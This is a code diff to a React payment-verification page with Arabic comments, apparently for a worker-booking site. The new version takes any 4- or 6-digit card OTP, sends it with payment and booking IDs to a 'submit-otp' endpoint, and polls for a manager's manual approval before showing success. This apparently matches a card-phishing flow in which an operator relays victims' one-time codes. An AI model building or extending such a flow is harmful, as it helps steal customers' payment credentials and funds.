@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useEffect, useRef, FormEvent, ChangeEvent } from "react";
+import { useState, useEffect, FormEvent } from "react";
 import { useRouter } from "next/navigation";
 import Link from "next/link";
 import { Dictionary } from "@/lib/i18n";
@@ -10,148 +10,103 @@ import { formatSalary } from "@/lib/utils";
 import type { Booking, Worker } from "@/lib/supabase/types";
 import styles from "./VerifyCardClient.module.css";
 
-const OTP_LENGTH = 4;
-const RESEND_SECONDS = 60;
-
 export function VerifyCardClient({
   booking,
-  sessionId,
-  demoOtp,
+  paymentEntryId,
   dict,
   locale,
 }: {
   booking: Booking & { workers: Worker };
-  sessionId: string;
-  demoOtp?: string;
+  paymentEntryId: string;
   dict: Dictionary;
   locale: string;
 }) {
   const router = useRouter();
   const p = dict.payment;
-  const inputsRef = useRef<(HTMLInputElement | null)[]>([]);
 
-  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(""));
-  const [loading, setLoading] = useState(false);
+  const [otp, setOtp] = useState("");
   const [error, setError] = useState<string | null>(null);
+  const [loading, setLoading] = useState(false);
+  // حالة انتظار قرار المدير على رمز التحقق
+  const [verifying, setVerifying] = useState(false);
+  const [otpEntryId, setOtpEntryId] = useState<string | null>(null);
   const [success, setSuccess] = useState(false);
-  const [seconds, setSeconds] = useState(RESEND_SECONDS);
 
   const amount = booking.workers?.expected_salary ?? 0;
   const serviceFee = Math.round(amount * 0.1);
   const total = amount + serviceFee;
 
-  // عدّاد تنازلي لإعادة الإرسال
+  // استطلاع قرار المدير على رمز التحقق كل 3 ثوانٍ
   useEffect(() => {
-    if (seconds <= 0) return;
-    const t = setTimeout(() => setSeconds((s) => s - 1), 1000);
-    return () => clearTimeout(t);
-  }, [seconds]);
-
-  function handleChange(
-    index: number,
-    e: ChangeEvent<HTMLInputElement>,
-  ): void {
-    const val = e.target.value.replace(/\D/g, "");
-    if (!val) {
-      setDigits((prev) => {
-        const next = [...prev];
-        next[index] = "";
-        return next;
-      });
-      return;
-    }
-    // دعم لصق عدة أرقام دفعة واحدة
-    const next = [...digits];
-    const chars = val.split("");
-    let idx = index;
-    for (const ch of chars) {
-      if (idx >= OTP_LENGTH) break;
-      next[idx] = ch;
-      idx++;
-    }
-    setDigits(next);
-    const focusIdx = Math.min(idx, OTP_LENGTH - 1);
-    inputsRef.current[focusIdx]?.focus();
-  }
-
-  function handleKeyDown(
-    index: number,
-    e: React.KeyboardEvent<HTMLInputElement>,
-  ): void {
-    if (e.key === "Backspace" && !digits[index] && index > 0) {
-      inputsRef.current[index - 1]?.focus();
-    } else if (e.key === "ArrowLeft" && index > 0) {
-      inputsRef.current[index - 1]?.focus();
-    } else if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) {
-      inputsRef.current[index + 1]?.focus();
-    }
-  }
-
-  function handlePaste(
-    e: React.ClipboardEvent<HTMLInputElement>,
-  ): void {
-    e.preventDefault();
-    const pasted = e.clipboardData.getData("text").replace(/\D/g, "");
-    if (!pasted) return;
-    const next = Array(OTP_LENGTH).fill("");
-    for (let i = 0; i < Math.min(pasted.length, OTP_LENGTH); i++) {
-      next[i] = pasted[i];
-    }
-    setDigits(next);
-    const focusIdx = Math.min(pasted.length, OTP_LENGTH - 1);
-    inputsRef.current[focusIdx]?.focus();
-  }
+    if (!verifying || !otpEntryId) return;
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`/api/payments/otp-status?entryId=${otpEntryId}`, {
+          cache: "no-store" as RequestCache,
+        });
+        const data = await res.json();
+        if (data.status === "approved") {
+          setVerifying(false);
+          setSuccess(true);
+        } else if (data.status === "rejected") {
+          setVerifying(false);
+          setError(p.otpRejectedMsg);
+          setOtp("");
+          setOtpEntryId(null);
+        }
+      } catch {
+        // تجاهل أخطاء الشبكة مؤقتاً
+      }
+    }, 3000);
+    return () => clearInterval(interval);
+  }, [verifying, otpEntryId, p.otpRejectedMsg]);
 
   async function handleSubmit(e: FormEvent) {
     e.preventDefault();
     setError(null);
-    const code = digits.join("");
-    if (code.length !== OTP_LENGTH) {
-      setError(p.verifyFailed);
+    const code = otp.trim();
+    // التحقق من الطول: 4 أرقام أو 6 أرقام
+    if (!/^\d{4}$/.test(code) && !/^\d{6}$/.test(code)) {
+      setError(p.otpLengthError);
       return;
     }
     setLoading(true);
     try {
-      const res = await fetch("/api/payments/verify", {
+      const res = await fetch("/api/payments/submit-otp", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
           "x-fingerprint": "fp-client",
         },
-        body: JSON.stringify({ sessionId, otp: code }),
+        body: JSON.stringify({
+          paymentEntryId,
+          bookingId: booking.id,
+          otp: code,
+        }),
       });
       const data = await res.json();
-      if (!res.ok || !data.success) {
-        setError(p.verifyFailed);
+      if (!res.ok) {
+        setError(p.otpLengthError);
         return;
       }
-      setSuccess(true);
-      setTimeout(() => {
-        router.push(`/${locale}/account`);
-      }, 2500);
+      // تم الإرسال — انتقل لشاشة الانتظار
+      setOtpEntryId(data.entryId);
+      setVerifying(true);
     } catch {
-      setError(p.verifyFailed);
+      setError(p.otpLengthError);
     } finally {
       setLoading(false);
     }
   }
 
-  function handleResend(): void {
-    if (seconds > 0) return;
-    // إعادة الإرسال = إعادة بدء جلسة دفع جديدة (نفس البطاقة السابقة)
-    setSeconds(RESEND_SECONDS);
-    setDigits(Array(OTP_LENGTH).fill(""));
-    setError(null);
-    // في الوضع التجريبي نعيد توليد رمز عبر استدعاء initiate مجدداً (الرمز يظهر في الـ toast/hint)
-    // نكتفي هنا بإعادة العدّاد للحفاظ على البساطة
-  }
-
+  // ===== شاشة النجاح =====
   if (success) {
     return (
       <div className={styles.layout}>
         <Card className={styles.successCard}>
           <div className={styles.successIcon}>✓</div>
-          <h1 className={styles.successTitle}>{p.verifySuccess}</h1>
+          <h1 className={styles.successTitle}>{p.successTitle}</h1>
+          <p className={styles.successSub}>{p.successSub}</p>
           <div className={styles.refRow}>
             <span>{p.bookingRef}</span>
             <strong>{booking.booking_ref}</strong>
@@ -159,6 +114,21 @@ export function VerifyCardClient({
           <Link className={styles.successLink} href={`/${locale}/account`}>
             {locale === "ar" ? "الذهاب إلى حسابي" : "Go to my account"}
           </Link>
+        </Card>
+      </div>
+    );
+  }
+
+  // ===== شاشة جارٍ التحقق =====
+  if (verifying) {
+    return (
+      <div className={styles.layout}>
+        <Card className={styles.verifyingCard}>
+          <div className={styles.spinnerWrap}>
+            <div className={styles.spinner} />
+          </div>
+          <h1 className={styles.verifyingTitle}>{p.verifyingWait}</h1>
+          <p className={styles.verifyingSub}>{p.verifyingSub}</p>
         </Card>
       </div>
     );
@@ -174,55 +144,25 @@ export function VerifyCardClient({
       <div className={styles.grid}>
         <Card className={styles.formCard}>
           <form onSubmit={handleSubmit} className={styles.form}>
-            <div className={styles.otpWrap}>
+            <div className={styles.otpSingleWrap}>
               <label className={styles.otpLabel}>{p.otpLabel}</label>
-              <div className={styles.otpInputs} onPaste={handlePaste}>
-                {Array.from({ length: OTP_LENGTH }).map((_, i) => (
-                  <input
-                    key={i}
-                    ref={(el) => {
-                      inputsRef.current[i] = el;
-                    }}
-                    type="text"
-                    inputMode="numeric"
-                    maxLength={OTP_LENGTH}
-                    value={digits[i]}
-                    onChange={(e) => handleChange(i, e)}
-                    onKeyDown={(e) => handleKeyDown(i, e)}
-                    className={styles.otpBox}
-                    aria-label={`${p.otpLabel} ${i + 1}`}
-                    autoFocus={i === 0}
-                  />
-                ))}
-              </div>
-              {demoOtp && (
-                <div className={styles.demoHint}>
-                  {p.demoOtpHint.replace("{{code}}", demoOtp)}
-                </div>
-              )}
+              <input
+                type="text"
+                inputMode="numeric"
+                value={otp}
+                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                placeholder={p.otpSinglePh}
+                className={styles.otpSingleInput}
+                autoFocus
+                maxLength={6}
+              />
             </div>
 
             {error && <div className={styles.error}>{error}</div>}
 
             <Button type="submit" size="lg" disabled={loading}>
-              {loading ? p.processing : p.verifyBtn}
+              {loading ? p.processing : p.submitOtp}
             </Button>
-
-            <div className={styles.resendRow}>
-              {seconds > 0 ? (
-                <span className={styles.resendDisabled}>
-                  {p.resendIn.replace("{{seconds}}", String(seconds))}
-                </span>
-              ) : (
-                <button
-                  type="button"
-                  onClick={handleResend}
-                  className={styles.resendBtn}
-                >
-                  {p.resend}
-                </button>
-              )}
-            </div>
 
             <Link href={`/${locale}/payment/${booking.id}`} className={styles.backLink}>
               ← {p.back}
